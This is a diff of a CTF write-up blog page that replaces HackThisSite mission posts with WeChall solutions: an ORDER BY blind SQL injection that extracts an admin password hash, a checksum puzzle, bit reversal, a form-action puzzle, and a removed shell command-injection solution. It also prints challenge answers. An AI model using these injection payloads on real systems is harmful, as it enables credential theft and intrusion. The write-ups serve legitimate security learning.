@@ -234,18 +234,18 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -281,7 +281,7 @@ p.spoiler {
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-07/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-order-by-query/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -299,7 +299,7 @@ p.spoiler {
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-07/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 7</a>
+          <a href="/wp/WeChall/wechall-order-by-query/" class="post-title-link" itemprop="url">WeChall - Order By Query</a>
         </h2>
 
         <div class="post-meta-container">
@@ -310,7 +310,179 @@ p.spoiler {
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-08 22:02:41" itemprop="dateCreated datePublished" datetime="2026-06-08T22:02:41+08:00">2026-06-08</time>
+      <time title="Created: 2026-06-10 13:28:32" itemprop="dateCreated datePublished" datetime="2026-06-10T13:28:32+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:33:36" itemprop="dateModified" datetime="2026-09-15T10:33:36+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-order-by-query/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-order-by-query/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>SQL injection in an <code>ORDER BY</code> clause. Recover Admin's
+32-character uppercase MD5 hash from the <code>users</code> table and
+submit it as the solution.</p>
+<h3 id="analysis">Analysis</h3>
+<p>Live source fetch (<code>index.php?highlight=christmas</code>)
+confirms the vulnerable view code:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$orderby</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlDisplayError</span>(<span class="string">&#x27;Error 1010101: Not in whitelist.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$orderby</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">escape</span>(<span class="variable">$orderby</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$orderby</span> <span class="subst">$dir</span> LIMIT 10&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>The bug is the non-strict <code>in_array()</code>. PHP loosely
+compares strings to numbers, so a value like
+<code>3,(SELECT ...)--</code> passes the whitelist check (converts to
+integer <code>3</code>), then reaches SQL as raw <code>ORDER BY</code>
+expression.</p>
+<p>Exposed table schema:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> users(</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">CHARACTER SET</span> ascii <span class="keyword">COLLATE</span> ascii_general_ci,</span><br><span class="line">    password <span class="type">CHAR</span>(<span class="number">32</span>) <span class="keyword">CHARACTER SET</span> ascii <span class="keyword">COLLATE</span> ascii_bin,</span><br><span class="line">    apples <span class="type">INT</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">    bananas <span class="type">INT</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">    cherries <span class="type">INT</span>(<span class="number">10</span>) UNSIGNED <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span>(username)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<h4 id="attempt-1-scalar-subquery-fails">Attempt 1: Scalar subquery
+(fails)</h4>
+<p>The initial approach used a scalar subquery in ORDER BY to compare
+one character at a time:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>,(<span class="keyword">SELECT</span> IF(<span class="built_in">SUBSTRING</span>(`password`,N,<span class="number">1</span>)<span class="operator">=</span><span class="type">CHAR</span>(X),<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="number">0x41646d696e</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>This does NOT work because MySQL evaluates scalar subqueries in ORDER
+BY as <strong>constants</strong> — the same value for all rows. Both
+<code>SELECT 0</code> and <code>SELECT 1</code> produce identical sort
+orders, so Admin's position never changes. Live diagnostic confirmed:
+both left Admin at position 12.</p>
+<h4 id="attempt-2-per-row-conditional-works">Attempt 2: Per-row
+conditional (works)</h4>
+<p>The key insight: <strong>column references and expressions</strong>
+in ORDER BY ARE evaluated per-row. The <code>password</code> column is
+directly accessible without a subquery:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>,IF(username<span class="operator">=</span><span class="number">0x41646d696e</span> <span class="keyword">AND</span> ASCII(<span class="built_in">SUBSTRING</span>(password,N,<span class="number">1</span>))<span class="operator">=</span>X,<span class="number">0</span>,<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>How it works: - <code>username=0x41646d696e</code> (hex for "Admin")
+identifies Admin's row - <code>ASCII(SUBSTRING(password,N,1))=X</code>
+checks the N-th character - <code>AND</code> combines: only Admin's row
+with matching character gets IF=0 - All other rows get IF=1 - With
+<code>ORDER BY 3, IF(...)</code>, Admin moves from position 13 → 10 when
+the condition is true</p>
+<p>The <code>--</code> comments out <code>DESC LIMIT 10</code>,
+returning all rows sorted by the injected expression.</p>
+<h4 id="extraction">Extraction</h4>
+<p>Binary search on hex character ASCII values (0-9: 48-57, A-F: 65-70)
+using <code>&gt;=</code> comparisons, with equality verification per
+position. About 5 requests per character × 32 positions ≈ 160 requests
+total.</p>
+<p><strong>Result</strong>: 二分爆破得到 32 位大写 hex 串（见文末
+spoiler）。</p>
+<h4 id="why-scalar-subqueries-fail-in-order-by">Why scalar subqueries
+fail in ORDER BY</h4>
+<p>In MySQL, ORDER BY evaluates expressions per row, but scalar
+subqueries are evaluated once and treated as constants. This is a common
+pitfall: <code>(SELECT ...)</code> in ORDER BY looks like it should work
+per-row, but the optimizer collapses it. Direct column references and
+non-subquery expressions (<code>IF(condition, value1, value2)</code>)
+are the correct path.</p>
+<h4 id="useful-observations">Useful observations</h4>
+<ul>
+<li><code>$db-&gt;escape()</code> does NOT strip parentheses — function
+calls and subqueries work fine</li>
+<li><code>in_array()</code> non-strict check: <code>3,anything</code>
+passes because PHP converts <code>"3,anything"</code> to integer
+<code>3</code></li>
+<li>Hex encoding (<code>0x41646d696e</code>) bypasses any single-quote
+escaping in <code>$db-&gt;escape()</code></li>
+<li>Backticks around <code>`password`</code> are needed in subquery
+contexts (to avoid collision with MySQL's <code>PASSWORD()</code>
+function) but not in direct expressions like
+<code>SUBSTRING(password,N,1)</code></li>
+<li>Admin's default position is 9 (sorted by apples DESC) or 13 (sorted
+by apples ASC)</li>
+<li>WeChall rate limits aggressively after ~80 rapid requests — use
+1.0-1.2s delays</li>
+</ul>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">3C3CBEB0C8ADC66F2922C65E7784BE14</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-checksums/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-training-checksums/" class="post-title-link" itemprop="url">WeChall - Training - Checksums</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-10 13:01:35" itemprop="dateCreated datePublished" datetime="2026-06-10T13:01:35+08:00">2026-06-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -338,8 +510,8 @@ p.spoiler {
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-07/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-07/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-training-checksums/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-checksums/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -354,36 +526,17 @@ p.spoiler {
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>This time Network Security Sam has saved the unencrypted level7
-password in an obscurely named file saved in this very directory. In
-other unrelated news, Sam has set up a script that returns the output
-from the UNIX cal command.</p>
-<p>Sam 把未加密的密码文件保存在当前目录下，文件名很隐蔽。另外，Sam
-还设置了一个脚本，可以返回 UNIX cal 命令的输出。</p>
-</blockquote>
-<p>页面有一个输入框，可以输入年份查看日历，调用的是后端的
-<code>cal.pl</code> Perl 脚本。</p>
+<p>Checksums 不是文件 MD5/SHA 题，而是 GAN（gizmore article
+number）校验位题。页面提供
+<code>gan.frm.htm</code>，其中泄露了校验算法。</p>
 <h3 id="solution">Solution</h3>
-<p>关键线索： 1. 密码文件在当前目录（<code>/missions/basic/7/</code>）
-2. 页面调用 UNIX <code>cal</code> 命令 3. 可以通过这个表单执行命令</p>
-<p>在 UNIX 中，可以用 <code>&amp;&amp;</code>
-连接多个命令。<code>cal 2024 &amp;&amp; ls</code>
-会先输出日历，然后列出当前目录的文件。</p>
-<p>将 <code>2024 &amp;&amp; ls</code> 输入到表单中：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;HackThisSite=YOUR_COOKIE&#x27;</span> \</span><br><span class="line">    -e <span class="string">&#x27;https://www.hackthissite.org/missions/basic/7/&#x27;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&#x27;cal=2024 &amp;&amp; ls&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.hackthissite.org/missions/basic/7/cal.pl&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>在日历输出之后，会看到目录中的文件列表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">level7.php</span><br><span class="line">k1kh31b1n55h.php   ← 这就是密码文件</span><br></pre></td></tr></table></figure>
-<p>访问
-<code>https://www.hackthissite.org/missions/basic/7/k1kh31b1n55h.php</code>
-即可获取密码。</p>
-<p>核心知识点：Command Injection（命令注入）。当用户输入被直接拼接到
-shell 命令中时，攻击者可以用
-<code>&amp;&amp;</code>、<code>;</code>、<code>|</code> 等 shell
-操作符注入额外的命令。防御方法是使用参数化调用（如 Python 的
-<code>subprocess.run</code> 配
-<code>shell=False</code>），或严格过滤输入。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">00d7c5f8</span></span>
+<p><code>gan.frm.htm</code> 中的核心逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$poly</span> = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">131</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">1</span>];</span><br><span class="line"><span class="variable">$sum</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$sum</span> = <span class="variable">$sum</span> * <span class="variable">$poly</span>[<span class="variable">$i</span>] + <span class="variable">$digit</span>[<span class="variable">$i</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$check</span> = <span class="variable">$sum</span> % <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
+<p>前 8 位是数据位，第 9 位必须等于上面计算出的 <code>check</code>。</p>
+<p>以默认值 <code>12345678</code> 为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">poly = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">131</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">1</span>]</span><br><span class="line">digits = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">s = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(digits):</span><br><span class="line">    s = s * poly[i] + d</span><br><span class="line"><span class="built_in">print</span>(s % <span class="number">10</span>)  <span class="comment"># =&gt; 3</span></span><br></pre></td></tr></table></figure>
+<p>所以合法 GAN 是 <code>123456783</code>，页面格式化显示为：</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">123-456-783</span></span>
 
       
     </div>
@@ -410,7 +563,7 @@ shell 命令中时，攻击者可以用
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-06/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-cgx-16-big-endian/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -428,7 +581,7 @@ shell 命令中时，攻击者可以用
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-06/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 6</a>
+          <a href="/wp/WeChall/wechall-cgx-16-big-endian/" class="post-title-link" itemprop="url">WeChall - CGX#16 - Big Endian</a>
         </h2>
 
         <div class="post-meta-container">
@@ -439,7 +592,129 @@ shell 命令中时，攻击者可以用
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-08 22:01:13" itemprop="dateCreated datePublished" datetime="2026-06-08T22:01:13+08:00">2026-06-08</time>
+      <time title="Created: 2026-06-10 12:59:38" itemprop="dateCreated datePublished" datetime="2026-06-10T12:59:38+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 09:52:05" itemprop="dateModified" datetime="2026-09-15T09:52:05+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-cgx-16-big-endian/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-cgx-16-big-endian/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>CGX#16: Big Endian 给出一个随机生成并绑定当前 session 的 bit
+stream，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001100101100101001110010001000101110001000110010010000100110001010100010101100100010001010000010</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p><strong>Recon</strong>: bit stream 长 96 bit，96 % 8 == 0，显然是
+8-bit bytes。但直接按普通二进制（MSB-first）解码得到乱码。题名 "Big
+Endian" 暗示不是普通的字节序问题：这里不是多字节整数的 byte
+order，而是<strong>每个字节内部的 bit 权重反着读</strong>：最左 bit 是
+LSB，最右 bit 是 MSB。</p>
+<p>以第一个字节 <code>00110010</code> 为例，按本题权重计算：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0×1 + 0×2 + 1×4 + 1×8 + 0×16 + 0×32 + 1×64 + 0×128 = 76 = &#x27;L&#x27;</span><br></pre></td></tr></table></figure>
+<p>等价做法是先反转每个字节内部的 bit，再按普通二进制解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00110010 -&gt; 01001100 -&gt; 76 -&gt; L</span><br></pre></td></tr></table></figure>
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bits = <span class="string">&#x27;001100101100101001110010001000101110001000110010010000100110001010100010101100100010001010000010&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(bits) % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(bits[i:i+<span class="number">8</span>][::-<span class="number">1</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure>
+<p>本地验证示例输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LSNDGLBFEMDA</span><br></pre></td></tr></table></figure>
+<p>只反转每个字节内部的
+bit，不要反转字节顺序。实际提交前要解自己页面当前 session 的 bit
+stream。</p>
+<blockquote>
+<p>session-bound: reverse bits per byte, answer varies</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-no-action/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-no-action/" class="post-title-link" itemprop="url">WeChall - No Action</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-10 12:57:51" itemprop="dateCreated datePublished" datetime="2026-06-10T12:57:51+08:00">2026-06-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -467,8 +742,8 @@ shell 命令中时，攻击者可以用
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-06/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-06/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-no-action/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-no-action/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -484,30 +759,23 @@ shell 命令中时，攻击者可以用
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>Network Security Sam has encrypted his password. The encryption
-system is publically available and can be accessed with this form.</p>
-<p>Sam
-把他的密码加密了。加密系统是公开的，可以通过页面上的表单访问。</p>
+<p>Hello hacker, In this challenge you will find a little form, but
+where does it sends it's data too?! Good Luck!</p>
+<ul>
+<li>gizmore</li>
+</ul>
 </blockquote>
-<p>已知加密后的密码：<code>477djk?=</code></p>
-<p>页面提供了一个加密工具，可以输入任意字符串查看加密结果。</p>
+<p>页面上只有一个小表单。题目问的是：这个表单到底把数据提交到哪里？</p>
 <h3 id="solution">Solution</h3>
-<p>这题需要逆向加密算法。先用加密工具测试几组已知明文，观察规律：</p>
-<p>输入 <code>aaaa</code>（4个相同的字符）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa → abcd</span><br></pre></td></tr></table></figure>
-<p>规律很明显：每个字符的 ASCII 值加上了它的位置索引（从0开始）。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a(0) + 0 = a</span><br><span class="line">a(1) + 1 = b</span><br><span class="line">a(2) + 2 = c</span><br><span class="line">a(3) + 3 = d</span><br></pre></td></tr></table></figure>
-<p>所以加密公式是：<code>encrypted[i] = chr(ord(plaintext[i]) + i)</code></p>
-<p>解密即为逆操作：<code>plaintext[i] = chr(ord(encrypted[i]) - i)</code></p>
-<p>Python 解密脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encrypted = <span class="string">&quot;477djk?=&quot;</span></span><br><span class="line">decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted):</span><br><span class="line">    decrypted += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - i)</span><br><span class="line"><span class="built_in">print</span>(decrypted)  <span class="comment"># 465aff96</span></span><br></pre></td></tr></table></figure>
-<p>验证：重新加密 <code>465aff96</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4 + 0 = 4</span><br><span class="line">6 + 1 = 7</span><br><span class="line">5 + 2 = 7</span><br><span class="line">a + 3 = d</span><br><span class="line">f + 4 = j</span><br><span class="line">f + 5 = k</span><br><span class="line">9 + 6 = ?</span><br><span class="line">6 + 7 = =</span><br></pre></td></tr></table></figure>
-<p>结果：<code>477djk?=</code>，与已知密文完全匹配。</p>
-<p>自定义加密算法如果有公开的加密
-oracle（可以任意加密已知明文），攻击者可以通过 chosen-plaintext attack
-推导出算法逻辑，进而解密任意密文。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">465aff96</span></span>
+<p>核心是看 HTML
+source，而不是看渲染后的表单。表单本身没有明显按钮动作，真正线索在
+<code>action</code>。</p>
+<p>源码里可以看到类似结构：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;indice.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>因此表单提交目标不是当前题目页，也不是 <code>?</code>，而是隐藏在
+action 属性里的 <code>indice.php</code>。</p>
+<p>答案就是表单提交到的文件名：</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">indice.php</span></span>
 
       
     </div>
@@ -534,7 +802,7 @@ oracle（可以任意加密已知明文），攻击者可以通过 chosen-plaint
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-05/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-2021-christmas-hippety/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -552,7 +820,7 @@ oracle（可以任意加密已知明文），攻击者可以通过 chosen-plaint
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-05/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 5</a>
+          <a href="/wp/WeChall/wechall-2021-christmas-hippety/" class="post-title-link" itemprop="url">WeChall - 2021 Christmas Hippety</a>
         </h2>
 
         <div class="post-meta-container">
@@ -563,7 +831,137 @@ oracle（可以任意加密已知明文），攻击者可以通过 chosen-plaint
